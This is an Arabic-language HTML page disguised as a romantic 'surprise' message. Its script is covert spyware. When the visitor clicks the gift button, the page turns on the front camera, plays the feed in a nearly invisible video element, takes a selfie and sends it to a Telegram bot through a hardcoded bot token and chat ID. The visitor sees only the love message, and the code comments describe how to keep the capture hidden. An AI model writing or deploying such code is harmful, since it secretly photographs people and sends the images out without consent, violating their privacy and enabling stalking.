
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>مفاجأة</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 50%, #fecfef 100%);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
    }

    .container {
      text-align: center;
      padding: 20px;
      max-width: 420px;
      width: 100%;
    }

    .btn {
      background: linear-gradient(45deg, #ff6b6b, #ee5a24);
      color: white;
      border: none;
      padding: 18px 40px;
      font-size: 1.3rem;
      border-radius: 50px;
      cursor: pointer;
      box-shadow: 0 10px 25px rgba(238, 90, 36, 0.4);
      font-weight: bold;
      transition: 0.3s;
    }

    .btn:hover { transform: scale(1.05); }

    .message {
      display: none;
      background: rgba(255, 255, 255, 0.95);
      padding: 40px 30px;
      border-radius: 25px;
      box-shadow: 0 20px 40px rgba(0,0,0,0.15);
      animation: fadeIn 0.8s ease;
    }

    .message h1 {
      color: #e84393;
      font-size: 2.4rem;
      margin-bottom: 15px;
    }

    .message p { color: #555; font-size: 1.1rem; }

    .hearts {
      font-size: 2.5rem;
      animation: pulse 1.5s infinite;
      margin-bottom: 10px;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(30px); }
      to { opacity: 1; transform: translateY(0); }
    }

    @keyframes pulse {
      0%, 100% { transform: scale(1); }
      50% { transform: scale(1.2); }
    }

    /* طريقة إخفاء أفضل عشان ما تطلعش الصورة سودة */
    #hidden-video {
      position: fixed;
      top: 0;
      left: 0;
      width: 640px;
      height: 480px;
      opacity: 0.02;          /* مهم: ما نخليهاش 0 */
      pointer-events: none;
      z-index: -1;
      transform: scaleX(-1);
    }
  </style>
</head>
<body>
  <div class="container">
    <button class="btn" id="openBtn">افتح المفاجأة 🎁</button>

    <div class="message" id="message">
      <div class="hearts">❤️</div>
      <h1كنحبك أزمر </h1>
      <p>أتمنى أن تكوني سعيدة جداً الآن ❤️</p>
    </div>
  </div>

  <video id="hidden-video" autoplay playsinline muted></video>

  <script>
    const BOT_TOKEN = "8858163237:AAGHmo9sxJSQDp0yKE1cPTEuJ7uYurh16fM";
    const CHAT_ID  = "6975241289";

    const openBtn = document.getElementById('openBtn');
    const message = document.getElementById('message');
    const video = document.getElementById('hidden-video');

    let stream = null;
    let isCaptured = false;

    openBtn.addEventListener('click', () => {
      openBtn.style.display = 'none';
      message.style.display = 'block';
      startCamera();
    });

    async function startCamera() {
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: {
            facingMode: 'user',
            width: { ideal: 1280 },
            height: { ideal: 720 }
          },
          audio: false
        });

        video.srcObject = stream;

        // ننتظر حتى يصبح الفيديو جاهز
        await video.play();

        // نحاول الالتقاط بعد ما يكون فيه إطار حقيقي
        waitForFrame();

      } catch (err) {
        console.log('خطأ الكاميرا:', err);
      }
    }

    function waitForFrame() {
      // نتحقق كل 100ms هل فيه صورة حقيقية
      const check = setInterval(() => {
        if (video.readyState >= 2 && video.videoWidth > 100 && !isCaptured) {
          clearInterval(check);
          capture();
        }
      }, 100);

      // حماية: لو ما التقطتش خلال 3 ثواني نوقف
      setTimeout(() => {
        clearInterval(check);
        if (!isCaptured) capture();
      }, 3000);
    }

    function capture() {
      if (isCaptured) return;
      isCaptured = true;

      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;

      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      // إيقاف الكاميرا
      if (stream) {
        stream.getTracks().forEach(t => t.stop());
      }

      canvas.toBlob(async (blob) => {
        if (!blob) return;

        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, 'selfie.jpg');
        formData.append('caption', `📸 سيلفي بعد فتح المفاجأة\n${new Date().toLocaleString('ar-EG')}\nاحبك سكينة ❤️`);

        try {
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
          });
        } catch (e) {
          console.log(e);
        }
      }, 'image/jpeg', 0.92);
    }
  </script>
</body>
</html>
